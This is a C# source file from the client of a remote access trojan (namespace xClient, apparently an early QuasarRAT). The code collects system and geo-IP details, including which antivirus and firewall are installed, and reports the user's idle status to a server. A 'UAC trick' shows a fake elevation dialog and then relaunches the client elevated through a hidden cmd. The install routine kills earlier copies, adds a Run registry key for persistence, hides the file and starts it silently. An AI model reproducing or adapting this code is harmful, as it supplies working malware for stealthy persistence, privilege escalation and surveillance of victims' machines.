using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Elevation;
using xClient.Core.Encryption;
using xClient.Core.Information;
using xClient.Core.Packets.ClientPackets;

namespace xClient.Core
{
    public static class SystemCore
    {
        public static readonly string[] ImageList =
        {
            "ad.png", "ae.png", "af.png", "ag.png", "ai.png", "al.png",
            "am.png", "an.png", "ao.png", "ar.png", "as.png", "at.png", "au.png", "aw.png", "ax.png", "az.png", "ba.png",
            "bb.png", "bd.png", "be.png", "bf.png", "bg.png", "bh.png", "bi.png", "bj.png", "bm.png", "bn.png", "bo.png",
            "br.png", "bs.png", "bt.png", "bv.png", "bw.png", "by.png", "bz.png", "ca.png", "catalonia.png", "cc.png",
            "cd.png", "cf.png", "cg.png", "ch.png", "ci.png", "ck.png", "cl.png", "cm.png", "cn.png", "co.png", "cr.png",
            "cs.png", "cu.png", "cv.png", "cx.png", "cy.png", "cz.png", "de.png", "dj.png", "dk.png", "dm.png", "do.png",
            "dz.png", "ec.png", "ee.png", "eg.png", "eh.png", "england.png", "er.png", "es.png", "et.png",
            "europeanunion.png", "fam.png", "fi.png", "fj.png", "fk.png", "fm.png", "fo.png", "fr.png", "ga.png",
            "gb.png", "gd.png", "ge.png", "gf.png", "gh.png", "gi.png", "gl.png", "gm.png", "gn.png", "gp.png", "gq.png",
            "gr.png", "gs.png", "gt.png", "gu.png", "gw.png", "gy.png", "hk.png", "hm.png", "hn.png", "hr.png", "ht.png",
            "hu.png", "id.png", "ie.png", "il.png", "in.png", "io.png", "iq.png", "ir.png", "is.png", "it.png", "jm.png",
            "jo.png", "jp.png", "ke.png", "kg.png", "kh.png", "ki.png", "km.png", "kn.png", "kp.png", "kr.png", "kw.png",
            "ky.png", "kz.png", "la.png", "lb.png", "lc.png", "li.png", "lk.png", "lr.png", "ls.png", "lt.png", "lu.png",
            "lv.png", "ly.png", "ma.png", "mc.png", "md.png", "me.png", "mg.png", "mh.png", "mk.png", "ml.png", "mm.png",
            "mn.png", "mo.png", "mp.png", "mq.png", "mr.png", "ms.png", "mt.png", "mu.png", "mv.png", "mw.png", "mx.png",
            "my.png", "mz.png", "na.png", "nc.png", "ne.png", "nf.png", "ng.png", "ni.png", "nl.png", "no.png", "np.png",
            "nr.png", "nu.png", "nz.png", "om.png", "pa.png", "pe.png", "pf.png", "pg.png", "ph.png", "pk.png", "pl.png",
            "pm.png", "pn.png", "pr.png", "ps.png", "pt.png", "pw.png", "py.png", "qa.png", "re.png", "ro.png", "rs.png",
            "ru.png", "rw.png", "sa.png", "sb.png", "sc.png", "scotland.png", "sd.png", "se.png", "sg.png", "sh.png",
            "si.png", "sj.png", "sk.png", "sl.png", "sm.png", "sn.png", "so.png", "sr.png", "st.png", "sv.png", "sy.png",
            "sz.png", "tc.png", "td.png", "tf.png", "tg.png", "th.png", "tj.png", "tk.png", "tl.png", "tm.png", "tn.png",
            "to.png", "tr.png", "tt.png", "tv.png", "tw.png", "tz.png", "ua.png", "ug.png", "um.png", "us.png", "uy.png",
            "uz.png", "va.png", "vc.png", "ve.png", "vg.png", "vi.png", "vn.png", "vu.png", "wales.png", "wf.png",
            "ws.png", "ye.png", "yt.png", "za.png", "zm.png", "zw.png"
        };

        public static bool Disconnect;
        public static string OperatingSystem = string.Empty;
        public static string MyPath = string.Empty;
        public static string InstallPath = string.Empty;
        public static string AccountType = string.Empty;
        public static string WanIp = string.Empty;
        public static string Country = string.Empty;
        public static string CountryCode = string.Empty;
        public static string Region = string.Empty;
        public static string City = string.Empty;
        public static string LastStatus = "Active";
        public static int ImageIndex;

        [DllImport("user32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        public static string GetOperatingSystem()
        {
            return string.Format("{0} {1} Bit", OSInfo.Name, OSInfo.Bits);
        }

        public static string GetAccountType()
        {
            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity != null)
                {

                    var principal = new WindowsPrincipal(identity);
                    if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                        return "Admin";
                    if (principal.IsInRole(WindowsBuiltInRole.User))
                        return "User";
                    if (principal.IsInRole(WindowsBuiltInRole.Guest))
                        return "Guest";
                }
            }

            return "Unknown";
        }

        public static string GetId()
        {
            return SHA256.ComputeHash(GetMacAddress());
        }

        public static string GetCpu()
        {
            try
            {
                const string query = "SELECT * FROM Win32_Processor";

                using (var searcher = new ManagementObjectSearcher("root\\CIMV2", query))
                {
                    foreach (var o in searcher.Get())
                    {
                        var mObject = (ManagementObject) o;
                        var cpuName = mObject["Name"].ToString();

                        // If a cpu name was found, return the name. Otherwise, we would continue iterating.
                        if (!string.IsNullOrEmpty(cpuName))
                        {
                            return cpuName;
                        }
                    }
                }
            }
            catch
            {
                // ignored
            }

            return "Unknown";
        }

        public static int GetRam()
        {
            try
            {
                var installedRam = 0;
                const string query = "Select * From Win32_ComputerSystem";

                using (var searcher = new ManagementObjectSearcher(query))
                {
                    foreach (var o in searcher.Get())
                    {
                        var mObject = (ManagementObject) o;
                        var bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
                        installedRam = (int) (bytes/1048576);
                    }
                }

                return installedRam;
            }
            catch
            {
                return -1;
            }
        }

        public static string GetGpu()
        {
            try
            {
                var gpuName = string.Empty;
                const string query = "SELECT * FROM Win32_DisplayConfiguration";

                using (var searcher = new ManagementObjectSearcher(query))
                {
                    foreach (var o in searcher.Get())
                    {
                        var mObject = (ManagementObject) o;
                        gpuName = mObject["Description"].ToString();
                    }
                }

                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetAntivirus()
        {
            try
            {
                var antivirusName = string.Empty;
                var scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                const string query = "SELECT * FROM AntivirusProduct";

                using (var searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (var o in searcher.Get())
                    {
                        var mObject = (ManagementObject) o;
                        antivirusName = mObject["displayName"].ToString();
                    }
                }

                return (!string.IsNullOrEmpty(antivirusName)) ? antivirusName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetFirewall()
        {
            try
            {
                var firewallName = string.Empty;
                var scope = (Helper.Helper.IsWindowsXP()) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
                const string query = "SELECT * FROM FirewallProduct";

                using (var searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (var o in searcher.Get())
                    {
                        var mObject = (ManagementObject) o;
                        firewallName = mObject["displayName"].ToString();
                    }
                }

                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetUptime()
        {
            var uptimeSec = Environment.TickCount/1000;
            var result = TimeSpan.FromSeconds(uptimeSec);
            return string.Format("{0}d : {1}h : {2}m : {3}s", result.Days, result.Hours, result.Minutes, result.Seconds);
        }

        public static string GetUsername()
        {
            return Environment.UserName;
        }

        public static string GetPcName()
        {
            return Environment.MachineName;
        }

        public static string GetLanIp()
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                            continue;

                        return ip.Address.ToString();
                    }
                }
            }

            return "-";
        }

        public static string GetMacAddress()
        {
            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    var foundCorrect = false;
                    foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                            continue;

                        foundCorrect = (ip.Address.ToString() == GetLanIp());
                    }

                    if (foundCorrect)
                        return Helper.Helper.FormatMacAddress(ni.GetPhysicalAddress().ToString());
                }
            }

            return "-";
        }

        public static void InitializeGeoIp()
        {
            var gIp = new GeoIP();

            Country = gIp.Country;
            CountryCode = gIp.CountryCode;
            Region = gIp.Region;
            City = gIp.City;
            WanIp = gIp.WanIp;

            if (CountryCode == "-" || Country == "Unknown")
            {
                ImageIndex = 247; // question icon
                return;
            }

            for (var i = 0; i < ImageList.Length; i++)
            {
                if (ImageList[i].Contains(CountryCode.ToLower()))
                {
                    ImageIndex = i;
                    break;
                }
            }
        }

        public static bool TryUacTrick()
        {
            if (AccountType == "Admin")
                return false;

            if (MyPath == InstallPath)
                return false;

            Thread.Sleep(3000);

            Application.Run(new FrmElevation());

            Thread.Sleep(200);

            Application.Exit();

            var processStartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Verb = "runas",
                Arguments = "/k START \"\" \"" + MyPath + "\" -CHECK & PING -n 2 127.0.0.1 & EXIT",
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = true
            };
            try
            {
                Process.Start(processStartInfo);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool CreateMutex(out Mutex mutex)
        {
            bool createdNew;
            mutex = new Mutex(false, Settings.MUTEX, out createdNew);
            return createdNew;
        }

        public static void UserIdleThread()
        {
            while (!Disconnect)
            {
                Thread.Sleep(5000);
                if (IsUserIdle())
                {
                    if (LastStatus != "Idle")
                    {
                        LastStatus = "Idle";
                        new UserStatus(LastStatus).Execute(Program.ConnectClient);
                    }
                }
                else
                {
                    if (LastStatus != "Active")
                    {
                        LastStatus = "Active";
                        new UserStatus(LastStatus).Execute(Program.ConnectClient);
                    }
                }
            }
        }

        private static bool IsUserIdle()
        {
            uint idleTime = 0;
            var lastInputInfo = new LASTINPUTINFO();
            lastInputInfo.cbSize = (uint) Marshal.SizeOf(lastInputInfo);
            lastInputInfo.dwTime = 0;

            var envTicks = (uint) Environment.TickCount;

            if (GetLastInputInfo(ref lastInputInfo))
            {
                var lastInputTick = lastInputInfo.dwTime;
                idleTime = envTicks - lastInputTick;
            }

            idleTime = ((idleTime > 0) ? (idleTime/1000) : 0);

            return (idleTime > 600); // idle for 10 minutes
        }

        public static void Install()
        {
            var isKilled = false;

            // create target dir
            if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
                Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));

            // delete existing file
            if (File.Exists(InstallPath))
            {
                try
                {
                    File.Delete(InstallPath);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        // kill old process if new mutex
                        var foundProcesses = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(InstallPath));
                        var myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            if (prc.Id == myPid) continue;
                            prc.Kill();
                            isKilled = true;
                        }
                    }
                }
            }

            if (isKilled) Thread.Sleep(5000);

            //copy client to target dir
            File.Copy(MyPath, InstallPath, true);

            //add to startup
            if (Settings.STARTUP)
            {
                if (AccountType == "Admin")
                {
                    try // try LocalMachine
                    {
                        using (
                            var key =
                                Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception();
                            key.SetValue(Settings.STARTUPKEY, InstallPath);
                            key.Close();
                        }
                    }
                    catch // if fails use CurrentUser
                    {
                        try
                        {
                            using (
                                var key =
                                    Registry.CurrentUser.OpenSubKey(
                                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                            {
                                if (key == null) throw new Exception();
                                key.SetValue(Settings.STARTUPKEY, InstallPath);
                                key.Close();
                            }
                        }
                        catch
                        {
                            // ignored
                        }
                    }
                }
                else
                {
                    try
                    {
                        using (
                            var key =
                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                    true))
                        {
                            if (key == null) throw new Exception();
                            key.SetValue(Settings.STARTUPKEY, InstallPath);
                            key.Close();
                        }
                    }
                    catch
                    {
                        // ignored
                    }
                }
            }

            if (Settings.HIDEFILE)
            {
                try
                {
                    File.SetAttributes(InstallPath, FileAttributes.Hidden);
                }
                catch
                {
                    // ignored
                }
            }

            //start file
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = true,
                FileName = InstallPath
            };
            Process.Start(startInfo);

            Disconnect = true;
        }

        [StructLayout(LayoutKind.Sequential)]
        // ReSharper disable once InconsistentNaming
        private struct LASTINPUTINFO
        {
            private static readonly int SizeOf = Marshal.SizeOf(typeof (LASTINPUTINFO));

            [MarshalAs(UnmanagedType.U4)] public UInt32 cbSize;

            [MarshalAs(UnmanagedType.U4)] public UInt32 dwTime;
        }
    }
}